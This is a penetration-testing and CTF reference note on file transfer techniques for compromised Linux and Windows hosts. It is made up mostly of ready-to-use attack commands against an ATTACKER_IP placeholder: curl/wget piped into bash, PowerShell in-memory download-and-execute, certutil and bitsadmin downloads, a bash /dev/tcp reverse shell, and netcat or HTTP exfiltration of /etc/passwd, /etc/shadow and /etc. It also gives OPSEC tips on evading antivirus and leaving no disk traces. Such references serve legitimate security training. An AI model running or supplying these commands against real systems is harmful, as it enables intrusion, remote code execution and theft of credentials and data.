---
title: File Transfer Techniques
tags:
  - reference
  - file-transfer
  - post-exploitation
  - ctf
  - linux
  - windows
topic: Reference
difficulty: intermediate
created: 2026-05-16
updated: 2026-05-16
source: HackTricks, PayloadsAllTheThings, GTFOBins
---

# File Transfer Techniques

## Overview
Getting tools and payloads onto a target machine — or exfiltrating data off it — is a core skill in penetration testing and CTFs. This note covers reliable methods for both Linux and Windows targets, organized by what's available on the system.

---

## Linux — Downloading to Target

### curl / wget (most common)
```bash
# curl
curl http://ATTACKER_IP:8000/file.sh -o file.sh
curl http://ATTACKER_IP:8000/file.sh | bash    # Execute directly

# wget
wget http://ATTACKER_IP:8000/file.sh -O file.sh
wget -q http://ATTACKER_IP:8000/file.sh -O- | bash   # Execute directly
```

### Python HTTP Server (on attacker machine)
```bash
# Python 3 (start in directory containing your files)
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000
```

### Netcat
```bash
# Attacker (sender) — listen and serve file
nc -lvnp 4444 < file.sh

# Target (receiver)
nc ATTACKER_IP 4444 > file.sh

# Reverse: target sends file to attacker
# Attacker:
nc -lvnp 4444 > received_file
# Target:
nc ATTACKER_IP 4444 < /etc/passwd
```

### SCP (when SSH is available)
```bash
# Push file to target
scp file.sh user@TARGET_IP:/tmp/file.sh

# Pull file from target
scp user@TARGET_IP:/etc/passwd ./passwd
```

### Base64 (bypass content filters)
```bash
# Encode on attacker
base64 -w 0 file.sh > file.b64
cat file.b64    # Copy the output

# Decode on target (paste the base64 string)
echo "BASE64STRING" | base64 -d > file.sh
chmod +x file.sh
```

---

## Windows — Downloading to Target

### PowerShell (most reliable)
```powershell
# Basic download
Invoke-WebRequest -Uri http://ATTACKER_IP:8000/file.exe -OutFile C:\Temp\file.exe

# Shorter alias
iwr http://ATTACKER_IP:8000/file.exe -OutFile C:\Temp\file.exe

# Download and execute in memory (no disk touch)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/script.ps1')

# Download with WebClient
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/file.exe', 'C:\Temp\file.exe')
```

### certutil (built-in, often not blocked)
```cmd
certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe C:\Temp\file.exe
```

### bitsadmin (background transfer)
```cmd
bitsadmin /transfer myJob http://ATTACKER_IP:8000/file.exe C:\Temp\file.exe
```

### SMB (impacket-smbserver on attacker)
```bash
# Attacker — start SMB share
impacket-smbserver share . -smb2support
# or with auth:
impacket-smbserver share . -smb2support -username user -password pass
```

```cmd
# Target — copy from SMB share
copy \\ATTACKER_IP\share\file.exe C:\Temp\file.exe

# Or run directly
\\ATTACKER_IP\share\file.exe
```

### Curl (Windows 10+)
```cmd
curl http://ATTACKER_IP:8000/file.exe -o C:\Temp\file.exe
```

---

## Exfiltration — Getting Data Out

### Linux → Attacker
```bash
# Netcat exfil
# Attacker (receive):
nc -lvnp 4444 > loot.tar.gz
# Target (send):
tar czf - /etc/ | nc ATTACKER_IP 4444

# curl POST to attacker's web server
curl -X POST http://ATTACKER_IP:8000/ -d @/etc/passwd

# Base64 encode sensitive file, display for copy/paste
base64 /etc/shadow
```

### Windows → Attacker
```powershell
# PowerShell POST
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secret.txt"))
Invoke-WebRequest -Uri http://ATTACKER_IP:8000/ -Method POST -Body $data

# SMB — copy to attacker share
copy C:\Users\user\Documents\secret.txt \\ATTACKER_IP\share\

# Certutil encode and display
certutil -encode C:\secret.txt C:\encoded.txt
type C:\encoded.txt
```

---

## Restricted Environments (No Tools Available)

### Python one-liners
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER_IP:8000/f','f')"
```

### /dev/tcp (bash built-in)
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1    # Reverse shell
exec 3<>/dev/tcp/ATTACKER_IP/4444; cat <&3    # Read from attacker
```

### PHP
```bash
php -r "file_put_contents('file.sh', file_get_contents('http://ATTACKER_IP:8000/file.sh'));"
```

### Ruby
```bash
ruby -e "require 'open-uri'; File.write('file.sh', URI.open('http://ATTACKER_IP:8000/file.sh').read)"
```

---

## Serving Files From Attacker

| Method | Command | Notes |
|--------|---------|-------|
| Python HTTP | `python3 -m http.server 8000` | No auth, any file in dir |
| PHP server | `php -S 0.0.0.0:8000` | No auth |
| Netcat | `nc -lvnp 4444 < file` | Single connection |
| SMB | `impacket-smbserver share . -smb2support` | Best for Windows targets |
| FTP | `python3 -m pyftpdlib -p 21` | When FTP is only option |

---

## OPSEC Notes

- Python HTTP server logs all requests — good for confirming delivery
- `/dev/tcp` leaves no artifacts on disk
- SMB auth (`-username -password`) required when Windows requires authentication
- Base64 bypasses many AV/EDR signatures on the payload itself but not behavior
- Large file transfers via netcat are unreliable — use scp or SMB instead

---

## Key Terms

| Term | Definition |
|------|------------|
| Exfiltration | Moving data from target to attacker-controlled system |
| LOLBAS | Living Off the Land Binaries — built-in Windows tools repurposed |
| SMB | Server Message Block — Windows file sharing protocol |
| impacket | Python library with network protocol implementations for pentesters |
| OPSEC | Operational Security — minimizing attacker footprint |

## Sources

Carlos Polop. (2024). *Exfiltration*. HackTricks. https://book.hacktricks.xyz/exfiltration

swisskyrepo. (2024). *File transfer*. PayloadsAllTheThings. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/File%20Transfer.md

GTFOBins. (n.d.). *Unix binaries — file download*. https://gtfobins.github.io/

---
<- [[Reference-MOC]]
